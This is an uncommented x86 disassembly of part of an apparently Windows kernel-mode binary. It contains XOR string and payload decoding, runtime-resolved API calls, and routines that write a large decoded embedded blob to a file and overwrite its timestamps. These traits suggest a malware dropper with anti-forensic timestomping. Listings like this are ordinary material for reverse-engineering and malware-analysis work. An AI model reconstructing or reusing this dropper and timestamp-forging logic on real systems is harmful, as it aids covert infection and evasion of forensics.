   177d7:	cmp    BYTE PTR [ebp-0x1],bl
   177da:	je     0x17845
   177dc:	mov    esi,DWORD PTR [ebp-0x1c]
   177df:	cmp    esi,ebx
   177e1:	je     0x17845
   177e3:	cmp    BYTE PTR [ebp-0xc],bl
   177e6:	jne    0x17845
   177e8:	push   0x6
   177ea:	pop    ecx
   177eb:	push   ebx
   177ec:	xor    eax,eax
   177ee:	mov    DWORD PTR [ebp-0x4c],ebx
   177f1:	lea    edi,[ebp-0x48]
   177f4:	push   0x1c
   177f6:	rep stos DWORD PTR es:[edi],eax
   177f8:	lea    eax,[ebp-0x4c]
   177fb:	push   eax
   177fc:	push   ebx
   177fd:	push   DWORD PTR [ebp+0x8]
   17800:	call   0x1190e
   17805:	call   eax
   17807:	cmp    DWORD PTR [ebp-0x44],esi
   1780a:	jne    0x17845
   1780c:	push   ebx
   1780d:	push   0x4
   1780f:	lea    eax,[ebp+0xc]
   17812:	push   eax
   17813:	push   0x9
   17815:	push   DWORD PTR [ebp+0x8]
   17818:	mov    DWORD PTR [ebp+0xc],ebx
   1781b:	call   0x1190e
   17820:	call   eax
   17822:	test   eax,eax
   17824:	jge    0x17829
   17826:	mov    DWORD PTR [ebp+0xc],ebx
   17829:	cmp    DWORD PTR [ebp+0xc],ebx
   1782c:	je     0x17845
   1782e:	lea    eax,[ebp-0x1c]
   17831:	push   eax
   17832:	push   DWORD PTR [ebp+0xc]
   17835:	call   0x1249e
   1783a:	lea    eax,[ebp-0x1c]
   1783d:	push   eax
   1783e:	push   0x1
   17840:	call   0x10ec0
   17845:	mov    eax,DWORD PTR [ebp-0x8]
   17848:	pop    edi
   17849:	pop    esi
   1784a:	pop    ebx
   1784b:	leave  
   1784c:	ret    0x8
   1784f:	int3   
   17850:	int3   
   17851:	int3   
   17852:	int3   
   17853:	int3   
   17854:	push   0x24
   17856:	push   0x7e0c8
   1785b:	call   0x1dab8
   17860:	xor    ebx,ebx
   17862:	push   ebx
   17863:	push   ebx
   17864:	push   ebx
   17865:	push   ebx
   17866:	push   0x7e560
   1786b:	call   DWORD PTR ds:0x1ee28
   17871:	cmp    eax,ebx
   17873:	jge    0x17884
   17875:	mov    eax,DWORD PTR [ebp+0x8]
   17878:	mov    DWORD PTR [eax+0x8],0x4
   1787f:	jmp    0x1793c
   17884:	mov    DWORD PTR [ebp-0x4],ebx
   17887:	push   0xffffffff
   17889:	mov    esi,DWORD PTR [ebp+0x8]
   1788c:	lea    eax,[esi+0xc]
   1788f:	push   eax
   17890:	lea    ecx,[ebp-0x24]
   17893:	call   0x1295a
   17898:	push   0xffffffff
   1789a:	mov    eax,DWORD PTR [ebp-0x20]
   1789d:	lea    eax,[eax+esi*1+0xd]
   178a1:	push   eax
   178a2:	lea    ecx,[ebp-0x2c]
   178a5:	call   0x1295a
   178aa:	push   0xffffffff
   178ac:	push   0x1ded0
   178b1:	lea    ecx,[ebp-0x34]
   178b4:	call   0x1109a
   178b9:	lea    eax,[ebp-0x34]
   178bc:	push   eax
   178bd:	lea    eax,[ebp-0x2c]
   178c0:	push   eax
   178c1:	call   0x197a0
   178c6:	mov    BYTE PTR [ebp-0x19],al
   178c9:	push   DWORD PTR [ebp-0x34]
   178cc:	call   0x1d9f8
   178d1:	pop    ecx
   178d2:	lea    eax,[ebp-0x24]
   178d5:	mov    ecx,DWORD PTR ds:0x7e530
   178db:	push   eax
   178dc:	cmp    BYTE PTR [ebp-0x19],bl
   178df:	je     0x178e8
   178e1:	call   0x16162
   178e6:	jmp    0x178f8
   178e8:	call   0x16eaa
   178ed:	lea    ecx,[ebp-0x2c]
   178f0:	push   ecx
   178f1:	mov    ecx,eax
   178f3:	call   0x1299c
   178f8:	mov    DWORD PTR [esi+0x8],ebx
   178fb:	push   DWORD PTR [ebp-0x2c]
   178fe:	call   0x1d9f8
   17903:	push   DWORD PTR [ebp-0x24]
   17906:	call   0x1d9f8
   1790b:	pop    ecx
   1790c:	pop    ecx
   1790d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17914:	jmp    0x17930
   17916:	xor    eax,eax
   17918:	inc    eax
   17919:	ret    
   1791a:	mov    esp,DWORD PTR [ebp-0x18]
   1791d:	mov    eax,DWORD PTR [ebp+0x8]
   17920:	mov    DWORD PTR [eax+0x8],0x4
   17927:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1792e:	xor    ebx,ebx
   17930:	push   ebx
   17931:	push   0x7e560
   17936:	call   DWORD PTR ds:0x1ee24
   1793c:	call   0x1dafd
   17941:	ret    0x4
   17944:	int3   
   17945:	int3   
   17946:	int3   
   17947:	int3   
   17948:	int3   
   17949:	int3   
   1794a:	push   0xc
   1794c:	push   0x7e0e8
   17951:	call   0x1dab8
   17956:	xor    edi,edi
   17958:	push   edi
   17959:	push   edi
   1795a:	push   edi
   1795b:	push   edi
   1795c:	push   0x7e560
   17961:	call   DWORD PTR ds:0x1ee28
   17967:	cmp    eax,edi
   17969:	jge    0x17977
   1796b:	mov    eax,DWORD PTR [ebp+0x8]
   1796e:	mov    DWORD PTR [eax+0x8],0x4
   17975:	jmp    0x179ed
   17977:	mov    DWORD PTR [ebp-0x4],edi
   1797a:	mov    esi,DWORD PTR [ebp+0x8]
   1797d:	lea    eax,[esi+0x4]
   17980:	mov    ecx,DWORD PTR ds:0x7e5bc
   17986:	push   eax
   17987:	cmp    DWORD PTR [esi],edi
   17989:	jbe    0x179b6
   1798b:	call   0x16f1a
   17990:	mov    ebx,eax
   17992:	push   DWORD PTR [esi]
   17994:	lea    eax,[esi+0xc]
   17997:	push   eax
   17998:	lea    ecx,[ebp-0x1c]
   1799b:	call   0x1379a
   179a0:	push   eax
   179a1:	mov    ecx,ebx
   179a3:	call   0x11f00
   179a8:	mov    ecx,DWORD PTR [ebp-0x1c]
   179ab:	cmp    ecx,edi
   179ad:	je     0x179bb
   179af:	call   0x10a86
   179b4:	jmp    0x179bb
   179b6:	call   0x16b4c
   179bb:	mov    DWORD PTR [esi+0x8],edi
   179be:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   179c5:	jmp    0x179e1
   179c7:	xor    eax,eax
   179c9:	inc    eax
   179ca:	ret    
   179cb:	mov    esp,DWORD PTR [ebp-0x18]
   179ce:	mov    eax,DWORD PTR [ebp+0x8]
   179d1:	mov    DWORD PTR [eax+0x8],0x4
   179d8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   179df:	xor    edi,edi
   179e1:	push   edi
   179e2:	push   0x7e560
   179e7:	call   DWORD PTR ds:0x1ee24
   179ed:	call   0x1dafd
   179f2:	ret    0x4
   179f5:	int3   
   179f6:	int3   
   179f7:	int3   
   179f8:	int3   
   179f9:	int3   
   179fa:	mov    edi,edi
   179fc:	push   ebp
   179fd:	mov    ebp,esp
   179ff:	sub    esp,0x10
   17a02:	and    DWORD PTR [ebp-0xc],0x0
   17a06:	xor    ecx,ecx
   17a08:	mov    DWORD PTR [ebp-0x10],0x1
   17a0f:	xor    eax,eax
   17a11:	mov    dl,BYTE PTR [eax+0x7a44c]
   17a17:	xor    BYTE PTR [ebp+ecx*1-0x10],dl
   17a1b:	inc    ecx
   17a1c:	inc    eax
   17a1d:	and    eax,0xf
   17a20:	cmp    ecx,0x8
   17a23:	jne    0x17a11
   17a25:	push   ecx
   17a26:	lea    eax,[ebp-0x10]
   17a29:	push   eax
   17a2a:	lea    ecx,[ebp-0x8]
   17a2d:	mov    DWORD PTR [ebp-0x4],0x2
   17a34:	call   0x1379a
   17a39:	mov    ecx,DWORD PTR ds:0x7e5bc
   17a3f:	push   eax
   17a40:	lea    eax,[ebp-0x4]
   17a43:	push   eax
   17a44:	call   0x16f1a
   17a49:	mov    ecx,eax
   17a4b:	call   0x11f00
   17a50:	mov    ecx,DWORD PTR [ebp-0x8]
   17a53:	test   ecx,ecx
   17a55:	je     0x17a5c
   17a57:	call   0x10a86
   17a5c:	leave  
   17a5d:	ret    
   17a5e:	int3   
   17a5f:	int3   
   17a60:	int3   
   17a61:	int3   
   17a62:	int3   
   17a63:	int3   
   17a64:	push   0x848
   17a69:	push   0x7e108
   17a6e:	call   0x1ddc0
   17a73:	xor    ebx,ebx
   17a75:	mov    BYTE PTR [ebp-0x81d],bl
   17a7b:	xor    eax,eax
   17a7d:	mov    WORD PTR [ebp-0x81c],ax
   17a84:	push   0x7fe
   17a89:	push   ebx
   17a8a:	lea    eax,[ebp-0x81a]
   17a90:	push   eax
   17a91:	call   0x1da92
   17a96:	add    esp,0xc
   17a99:	push   0x1e7d0
   17a9e:	push   0x15
   17aa0:	push   0x1e7a4
   17aa5:	call   0x16c50
   17aaa:	mov    edx,eax
   17aac:	mov    cx,WORD PTR [eax]
   17aaf:	inc    eax
   17ab0:	inc    eax
   17ab1:	cmp    cx,bx
   17ab4:	jne    0x17aac
   17ab6:	sub    eax,edx
   17ab8:	lea    edi,[ebp-0x81c]
   17abe:	dec    edi
   17abf:	dec    edi
   17ac0:	mov    cx,WORD PTR [edi+0x2]
   17ac4:	inc    edi
   17ac5:	inc    edi
   17ac6:	cmp    cx,bx
   17ac9:	jne    0x17ac0
   17acb:	mov    ecx,eax
   17acd:	mov    esi,edx
   17acf:	shr    ecx,0x2
   17ad2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17ad4:	mov    ecx,eax
   17ad6:	and    ecx,0x3
   17ad9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17adb:	mov    eax,0x7e408
   17ae0:	mov    edx,eax
   17ae2:	mov    cx,WORD PTR [eax]
   17ae5:	inc    eax
   17ae6:	inc    eax
   17ae7:	cmp    cx,bx
   17aea:	jne    0x17ae2
   17aec:	sub    eax,edx
   17aee:	lea    edi,[ebp-0x81c]
   17af4:	dec    edi
   17af5:	dec    edi
   17af6:	mov    cx,WORD PTR [edi+0x2]
   17afa:	inc    edi
   17afb:	inc    edi
   17afc:	cmp    cx,bx
   17aff:	jne    0x17af6
   17b01:	mov    ecx,eax
   17b03:	mov    esi,edx
   17b05:	shr    ecx,0x2
   17b08:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b0a:	mov    ecx,eax
   17b0c:	and    ecx,0x3
   17b0f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b11:	push   0x1e768
   17b16:	push   0x4
   17b18:	push   0x1e57c
   17b1d:	call   0x16c50
   17b22:	mov    edx,eax
   17b24:	mov    cx,WORD PTR [eax]
   17b27:	inc    eax
   17b28:	inc    eax
   17b29:	cmp    cx,bx
   17b2c:	jne    0x17b24
   17b2e:	sub    eax,edx
   17b30:	lea    edi,[ebp-0x81c]
   17b36:	dec    edi
   17b37:	dec    edi
   17b38:	mov    cx,WORD PTR [edi+0x2]
   17b3c:	inc    edi
   17b3d:	inc    edi
   17b3e:	cmp    cx,bx
   17b41:	jne    0x17b38
   17b43:	mov    ecx,eax
   17b45:	mov    esi,edx
   17b47:	shr    ecx,0x2
   17b4a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b4c:	mov    ecx,eax
   17b4e:	and    ecx,0x3
   17b51:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b53:	lea    eax,[ebp-0x81c]
   17b59:	push   eax
   17b5a:	lea    eax,[ebp-0x858]
   17b60:	push   eax
   17b61:	call   0x11c2c
   17b66:	call   eax
   17b68:	mov    DWORD PTR [ebp-0x824],ebx
   17b6e:	xor    eax,eax
   17b70:	lea    edi,[ebp-0x84c]
   17b76:	stos   DWORD PTR es:[edi],eax
   17b77:	stos   DWORD PTR es:[edi],eax
   17b78:	stos   DWORD PTR es:[edi],eax
   17b79:	stos   DWORD PTR es:[edi],eax
   17b7a:	stos   DWORD PTR es:[edi],eax
   17b7b:	mov    DWORD PTR [ebp-0x830],ebx
   17b81:	xor    eax,eax
   17b83:	lea    edi,[ebp-0x82c]
   17b89:	stos   DWORD PTR es:[edi],eax
   17b8a:	mov    DWORD PTR [ebp-0x850],0x18
   17b94:	mov    DWORD PTR [ebp-0x84c],ebx
   17b9a:	mov    DWORD PTR [ebp-0x844],0x240
   17ba4:	lea    eax,[ebp-0x858]
   17baa:	mov    DWORD PTR [ebp-0x848],eax
   17bb0:	mov    DWORD PTR [ebp-0x840],ebx
   17bb6:	mov    DWORD PTR [ebp-0x83c],ebx
   17bbc:	push   ebx
   17bbd:	push   ebx
   17bbe:	push   0x60
   17bc0:	push   0x1
   17bc2:	push   ebx
   17bc3:	push   0x80
   17bc8:	push   ebx
   17bc9:	lea    eax,[ebp-0x830]
   17bcf:	push   eax
   17bd0:	lea    eax,[ebp-0x850]
   17bd6:	push   eax
   17bd7:	push   0x100001
   17bdc:	lea    eax,[ebp-0x824]
   17be2:	push   eax
   17be3:	call   0x1183c
   17be8:	call   eax
   17bea:	cmp    eax,ebx
   17bec:	jge    0x17bf5
   17bee:	xor    al,al
   17bf0:	jmp    0x17c8a
   17bf5:	mov    DWORD PTR [ebp-0x4],ebx
   17bf8:	mov    esi,DWORD PTR [ebp+0xc]
   17bfb:	mov    eax,0x10000
   17c00:	cmp    esi,eax
   17c02:	jbe    0x17c06
   17c04:	mov    esi,eax
   17c06:	push   esi
   17c07:	call   0x10a52
   17c0c:	pop    ecx
   17c0d:	mov    DWORD PTR [ebp-0x828],eax
   17c13:	mov    DWORD PTR [ebp-0x838],ebx
   17c19:	xor    eax,eax
   17c1b:	lea    edi,[ebp-0x834]
   17c21:	stos   DWORD PTR es:[edi],eax
   17c22:	push   ebx
   17c23:	lea    eax,[ebp-0x838]
   17c29:	push   eax
   17c2a:	push   esi
   17c2b:	push   DWORD PTR [ebp-0x828]
   17c31:	lea    eax,[ebp-0x830]
   17c37:	push   eax
   17c38:	push   ebx
   17c39:	push   ebx
   17c3a:	push   ebx
   17c3b:	push   DWORD PTR [ebp-0x824]
   17c41:	call   0x11a88
   17c46:	call   eax
   17c48:	cmp    eax,ebx
   17c4a:	jl     0x17c71
   17c4c:	mov    ecx,DWORD PTR [ebp-0x82c]
   17c52:	mov    edi,DWORD PTR [ebp+0x8]
   17c55:	mov    esi,DWORD PTR [ebp-0x828]
   17c5b:	xor    eax,eax
   17c5d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   17c5f:	sete   al
   17c62:	mov    BYTE PTR [ebp-0x81d],al
   17c68:	jmp    0x17c71
   17c6a:	xor    eax,eax
   17c6c:	inc    eax
   17c6d:	ret    
   17c6e:	mov    esp,DWORD PTR [ebp-0x18]
   17c71:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17c78:	push   DWORD PTR [ebp-0x824]
   17c7e:	call   DWORD PTR ds:0x1ee60
   17c84:	mov    al,BYTE PTR [ebp-0x81d]
   17c8a:	call   0x1de08
   17c8f:	ret    0x8
   17c92:	int3   
   17c93:	int3   
   17c94:	int3   
   17c95:	int3   
   17c96:	int3   
   17c97:	int3   
   17c98:	push   0x874
   17c9d:	push   0x7e128
   17ca2:	call   0x1ddc0
   17ca7:	mov    eax,DWORD PTR [ebp+0x8]
   17caa:	mov    DWORD PTR [ebp-0x830],eax
   17cb0:	xor    ebx,ebx
   17cb2:	mov    BYTE PTR [ebp-0x81d],bl
   17cb8:	xor    eax,eax
   17cba:	mov    WORD PTR [ebp-0x81c],ax
   17cc1:	push   0x7fe
   17cc6:	push   ebx
   17cc7:	lea    eax,[ebp-0x81a]
   17ccd:	push   eax
   17cce:	call   0x1da92
   17cd3:	add    esp,0xc
   17cd6:	push   0x1e836
   17cdb:	push   0x15
   17cdd:	push   0x1e7a4
   17ce2:	call   0x16c50
   17ce7:	mov    edx,eax
   17ce9:	mov    cx,WORD PTR [eax]
   17cec:	inc    eax
   17ced:	inc    eax
   17cee:	cmp    cx,bx
   17cf1:	jne    0x17ce9
   17cf3:	sub    eax,edx
   17cf5:	lea    edi,[ebp-0x81c]
   17cfb:	dec    edi
   17cfc:	dec    edi
   17cfd:	mov    cx,WORD PTR [edi+0x2]
   17d01:	inc    edi
   17d02:	inc    edi
   17d03:	cmp    cx,bx
   17d06:	jne    0x17cfd
   17d08:	mov    ecx,eax
   17d0a:	mov    esi,edx
   17d0c:	shr    ecx,0x2
   17d0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d11:	mov    ecx,eax
   17d13:	and    ecx,0x3
   17d16:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d18:	mov    eax,0x7e408
   17d1d:	mov    edx,eax
   17d1f:	mov    cx,WORD PTR [eax]
   17d22:	inc    eax
   17d23:	inc    eax
   17d24:	cmp    cx,bx
   17d27:	jne    0x17d1f
   17d29:	sub    eax,edx
   17d2b:	lea    edi,[ebp-0x81c]
   17d31:	dec    edi
   17d32:	dec    edi
   17d33:	mov    cx,WORD PTR [edi+0x2]
   17d37:	inc    edi
   17d38:	inc    edi
   17d39:	cmp    cx,bx
   17d3c:	jne    0x17d33
   17d3e:	mov    ecx,eax
   17d40:	mov    esi,edx
   17d42:	shr    ecx,0x2
   17d45:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d47:	mov    ecx,eax
   17d49:	and    ecx,0x3
   17d4c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d4e:	push   0x1e7fe
   17d53:	push   0x4
   17d55:	push   0x1e57c
   17d5a:	call   0x16c50
   17d5f:	mov    edx,eax
   17d61:	mov    cx,WORD PTR [eax]
   17d64:	inc    eax
   17d65:	inc    eax
   17d66:	cmp    cx,bx
   17d69:	jne    0x17d61
   17d6b:	sub    eax,edx
   17d6d:	lea    edi,[ebp-0x81c]
   17d73:	dec    edi
   17d74:	dec    edi
   17d75:	mov    cx,WORD PTR [edi+0x2]
   17d79:	inc    edi
   17d7a:	inc    edi
   17d7b:	cmp    cx,bx
   17d7e:	jne    0x17d75
   17d80:	mov    ecx,eax
   17d82:	mov    esi,edx
   17d84:	shr    ecx,0x2
   17d87:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d89:	mov    ecx,eax
   17d8b:	and    ecx,0x3
   17d8e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d90:	lea    eax,[ebp-0x81c]
   17d96:	push   eax
   17d97:	lea    eax,[ebp-0x884]
   17d9d:	push   eax
   17d9e:	call   0x11c2c
   17da3:	call   eax
   17da5:	mov    DWORD PTR [ebp-0x824],ebx
   17dab:	xor    eax,eax
   17dad:	lea    edi,[ebp-0x850]
   17db3:	stos   DWORD PTR es:[edi],eax
   17db4:	stos   DWORD PTR es:[edi],eax
   17db5:	stos   DWORD PTR es:[edi],eax
   17db6:	stos   DWORD PTR es:[edi],eax
   17db7:	stos   DWORD PTR es:[edi],eax
   17db8:	mov    DWORD PTR [ebp-0x82c],ebx
   17dbe:	xor    eax,eax
   17dc0:	lea    edi,[ebp-0x828]
   17dc6:	stos   DWORD PTR es:[edi],eax
   17dc7:	mov    DWORD PTR [ebp-0x854],0x18
   17dd1:	mov    DWORD PTR [ebp-0x850],ebx
   17dd7:	mov    DWORD PTR [ebp-0x848],0x240
   17de1:	lea    eax,[ebp-0x884]
   17de7:	mov    DWORD PTR [ebp-0x84c],eax
   17ded:	mov    DWORD PTR [ebp-0x844],ebx
   17df3:	mov    DWORD PTR [ebp-0x840],ebx
   17df9:	push   ebx
   17dfa:	push   ebx
   17dfb:	push   0x60
   17dfd:	push   ebx
   17dfe:	push   ebx
   17dff:	push   0x80
   17e04:	push   ebx
   17e05:	lea    eax,[ebp-0x82c]
   17e0b:	push   eax
   17e0c:	lea    eax,[ebp-0x854]
   17e12:	push   eax
   17e13:	push   0x100002
   17e18:	lea    eax,[ebp-0x824]
   17e1e:	push   eax
   17e1f:	call   0x1183c
   17e24:	call   eax
   17e26:	cmp    eax,ebx
   17e28:	jge    0x17e31
   17e2a:	xor    al,al
   17e2c:	jmp    0x17f36
   17e31:	mov    DWORD PTR [ebp-0x4],ebx
   17e34:	xor    eax,eax
   17e36:	lea    edi,[ebp-0x82c]
   17e3c:	stos   DWORD PTR es:[edi],eax
   17e3d:	stos   DWORD PTR es:[edi],eax
   17e3e:	xor    edi,edi
   17e40:	mov    esi,0x10000
   17e45:	mov    DWORD PTR [ebp-0x834],edi
   17e4b:	mov    eax,DWORD PTR [ebp+0xc]
   17e4e:	cmp    edi,eax
   17e50:	jae    0x17e9b
   17e52:	mov    DWORD PTR [ebp-0x83c],ebx
   17e58:	mov    DWORD PTR [ebp-0x83c],edi
   17e5e:	mov    DWORD PTR [ebp-0x838],ebx
   17e64:	sub    eax,edi
   17e66:	cmp    eax,esi
   17e68:	jb     0x17e6c
   17e6a:	mov    eax,esi
   17e6c:	push   ebx
   17e6d:	push   ebx
   17e6e:	push   eax
   17e6f:	mov    eax,DWORD PTR [ebp-0x830]
   17e75:	add    eax,edi
   17e77:	push   eax
   17e78:	lea    eax,[ebp-0x82c]
   17e7e:	push   eax
   17e7f:	push   ebx
   17e80:	push   ebx
   17e81:	push   ebx
   17e82:	push   DWORD PTR [ebp-0x824]
   17e88:	call   0x11adc
   17e8d:	call   eax
   17e8f:	cmp    eax,ebx
   17e91:	jl     0x17f1d
   17e97:	add    edi,esi
   17e99:	jmp    0x17e45
   17e9b:	mov    BYTE PTR [ebp-0x81d],0x1
   17ea2:	mov    DWORD PTR [ebp-0x87c],ebx
   17ea8:	push   0x9
   17eaa:	pop    ecx
   17eab:	xor    eax,eax
   17ead:	lea    edi,[ebp-0x878]
   17eb3:	rep stos DWORD PTR es:[edi],eax
   17eb5:	mov    eax,DWORD PTR [ebp+0x10]
   17eb8:	mov    DWORD PTR [ebp-0x86c],eax
   17ebe:	mov    ecx,DWORD PTR [ebp+0x14]
   17ec1:	mov    DWORD PTR [ebp-0x868],ecx
   17ec7:	mov    DWORD PTR [ebp-0x874],eax
   17ecd:	mov    DWORD PTR [ebp-0x870],ecx
   17ed3:	mov    DWORD PTR [ebp-0x864],eax
   17ed9:	mov    DWORD PTR [ebp-0x860],ecx
   17edf:	mov    DWORD PTR [ebp-0x87c],eax
   17ee5:	mov    DWORD PTR [ebp-0x878],ecx
   17eeb:	mov    DWORD PTR [ebp-0x85c],0x80
   17ef5:	push   0x4
   17ef7:	push   0x28
   17ef9:	lea    eax,[ebp-0x87c]
   17eff:	push   eax
   17f00:	lea    eax,[ebp-0x82c]
   17f06:	push   eax
   17f07:	push   DWORD PTR [ebp-0x824]
   17f0d:	call   0x11ab2
   17f12:	call   eax
   17f14:	jmp    0x17f1d
   17f16:	xor    eax,eax
   17f18:	inc    eax
   17f19:	ret    
   17f1a:	mov    esp,DWORD PTR [ebp-0x18]
   17f1d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17f24:	push   DWORD PTR [ebp-0x824]
   17f2a:	call   DWORD PTR ds:0x1ee60
   17f30:	mov    al,BYTE PTR [ebp-0x81d]
   17f36:	call   0x1de08
   17f3b:	ret    0x10
   17f3e:	int3   
   17f3f:	int3   
   17f40:	int3   
   17f41:	int3   
   17f42:	int3   
   17f43:	int3   
   17f44:	push   0x874
   17f49:	push   0x7e148
   17f4e:	call   0x1ddc0
   17f53:	xor    ebx,ebx
   17f55:	mov    BYTE PTR [ebp-0x81d],bl
   17f5b:	mov    BYTE PTR [ebp-0x81e],bl
   17f61:	mov    DWORD PTR [ebp-0x828],ebx
   17f67:	mov    DWORD PTR [ebp-0x824],ebx
   17f6d:	xor    eax,eax
   17f6f:	mov    WORD PTR [ebp-0x81c],ax
   17f76:	push   0x7fe
   17f7b:	push   ebx
   17f7c:	lea    eax,[ebp-0x81a]
   17f82:	push   eax
   17f83:	call   0x1da92
   17f88:	add    esp,0xc
   17f8b:	push   0x1e896
   17f90:	push   0x15
   17f92:	push   0x1e7a4
   17f97:	call   0x16c50
   17f9c:	mov    edx,eax
   17f9e:	mov    cx,WORD PTR [eax]
   17fa1:	inc    eax
   17fa2:	inc    eax
   17fa3:	cmp    cx,bx
   17fa6:	jne    0x17f9e
   17fa8:	sub    eax,edx
   17faa:	lea    edi,[ebp-0x81c]
   17fb0:	dec    edi
   17fb1:	dec    edi
   17fb2:	mov    cx,WORD PTR [edi+0x2]
   17fb6:	inc    edi
   17fb7:	inc    edi
   17fb8:	cmp    cx,bx
   17fbb:	jne    0x17fb2
   17fbd:	mov    ecx,eax
   17fbf:	mov    esi,edx
   17fc1:	shr    ecx,0x2
   17fc4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17fc6:	mov    ecx,eax
   17fc8:	and    ecx,0x3
   17fcb:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17fcd:	mov    eax,0x7e448
   17fd2:	mov    edx,eax
   17fd4:	mov    cx,WORD PTR [eax]
   17fd7:	inc    eax
   17fd8:	inc    eax
   17fd9:	cmp    cx,bx
   17fdc:	jne    0x17fd4
   17fde:	sub    eax,edx
   17fe0:	lea    edi,[ebp-0x81c]
   17fe6:	dec    edi
   17fe7:	dec    edi
   17fe8:	mov    cx,WORD PTR [edi+0x2]
   17fec:	inc    edi
   17fed:	inc    edi
   17fee:	cmp    cx,bx
   17ff1:	jne    0x17fe8
   17ff3:	mov    ecx,eax
   17ff5:	mov    esi,edx
   17ff7:	shr    ecx,0x2
   17ffa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17ffc:	mov    ecx,eax
   17ffe:	and    ecx,0x3
   18001:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18003:	push   0x1e870
   18008:	push   0x4
   1800a:	push   0x1e866
   1800f:	call   0x16c50
   18014:	mov    edx,eax
   18016:	mov    cx,WORD PTR [eax]
   18019:	inc    eax
   1801a:	inc    eax
   1801b:	cmp    cx,bx
   1801e:	jne    0x18016
   18020:	sub    eax,edx
   18022:	lea    edi,[ebp-0x81c]
   18028:	dec    edi
   18029:	dec    edi
   1802a:	mov    cx,WORD PTR [edi+0x2]
   1802e:	inc    edi
   1802f:	inc    edi
   18030:	cmp    cx,bx
   18033:	jne    0x1802a
   18035:	mov    ecx,eax
   18037:	mov    esi,edx
   18039:	shr    ecx,0x2
   1803c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1803e:	mov    ecx,eax
   18040:	and    ecx,0x3
   18043:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18045:	lea    eax,[ebp-0x81c]
   1804b:	push   eax
   1804c:	lea    eax,[ebp-0x85c]
   18052:	push   eax
   18053:	call   0x11c2c
   18058:	call   eax
   1805a:	xor    eax,eax
   1805c:	lea    edi,[ebp-0x850]
   18062:	stos   DWORD PTR es:[edi],eax
   18063:	stos   DWORD PTR es:[edi],eax
   18064:	stos   DWORD PTR es:[edi],eax
   18065:	stos   DWORD PTR es:[edi],eax
   18066:	stos   DWORD PTR es:[edi],eax
   18067:	mov    DWORD PTR [ebp-0x834],ebx
   1806d:	xor    eax,eax
   1806f:	lea    edi,[ebp-0x830]
   18075:	stos   DWORD PTR es:[edi],eax
   18076:	mov    DWORD PTR [ebp-0x82c],ebx
   1807c:	mov    DWORD PTR [ebp-0x854],0x18
   18086:	mov    DWORD PTR [ebp-0x850],ebx
   1808c:	mov    DWORD PTR [ebp-0x848],0x240
   18096:	lea    eax,[ebp-0x85c]
   1809c:	mov    DWORD PTR [ebp-0x84c],eax
   180a2:	mov    DWORD PTR [ebp-0x844],ebx
   180a8:	mov    DWORD PTR [ebp-0x840],ebx
   180ae:	push   ebx
   180af:	push   ebx
   180b0:	push   ebx
   180b1:	push   0x1
   180b3:	push   0x7
   180b5:	push   ebx
   180b6:	push   ebx
   180b7:	lea    eax,[ebp-0x834]
   180bd:	push   eax
   180be:	lea    eax,[ebp-0x854]
   180c4:	push   eax
   180c5:	push   0x89
   180ca:	lea    eax,[ebp-0x82c]
   180d0:	push   eax
   180d1:	call   0x1183c
   180d6:	call   eax
   180d8:	cmp    eax,ebx
   180da:	jge    0x180e3
   180dc:	xor    al,al
   180de:	jmp    0x18202
   180e3:	mov    DWORD PTR [ebp-0x884],ebx
   180e9:	push   0x9
   180eb:	pop    ecx
   180ec:	xor    eax,eax
   180ee:	lea    edi,[ebp-0x880]
   180f4:	rep stos DWORD PTR es:[edi],eax
   180f6:	mov    DWORD PTR [ebp-0x4],ebx
   180f9:	push   0x4
   180fb:	push   0x28
   180fd:	lea    eax,[ebp-0x884]
   18103:	push   eax
   18104:	lea    eax,[ebp-0x834]
   1810a:	push   eax
   1810b:	push   DWORD PTR [ebp-0x82c]
   18111:	call   0x11b06
   18116:	call   eax
   18118:	cmp    eax,ebx
   1811a:	jl     0x18198
   1811c:	mov    esi,0x5b583
   18121:	push   esi
   18122:	call   0x10a52
   18127:	mov    edi,eax
   18129:	push   esi
   1812a:	push   0x1eea0
   1812f:	push   edi
   18130:	call   0x1da7a
   18135:	add    esp,0x10
   18138:	push   0x25
   1813a:	push   0x7a424
   1813f:	push   esi
   18140:	push   edi
   18141:	call   0x10aa6
   18146:	lea    eax,[ebp-0x828]
   1814c:	push   eax
   1814d:	push   esi
   1814e:	push   edi
   1814f:	lea    eax,[ebp-0x83c]
   18155:	push   eax
   18156:	call   0x1a01a
   1815b:	mov    BYTE PTR [ebp-0x83c],bl
   18161:	mov    eax,DWORD PTR [ebp-0x838]
   18167:	mov    DWORD PTR [ebp-0x824],eax
   1816d:	cmp    eax,ebx
   1816f:	je     0x1818a
   18171:	push   DWORD PTR [ebp-0x828]
   18177:	push   eax
   18178:	call   0x17a64
   1817d:	test   al,al
   1817f:	je     0x1818a
   18181:	mov    BYTE PTR [ebp-0x81d],0x1
   18188:	jmp    0x18198
   1818a:	mov    BYTE PTR [ebp-0x81d],0x1
   18191:	mov    BYTE PTR [ebp-0x81e],0x1
   18198:	mov    DWORD PTR [ebp-0x4],0xfffffffe
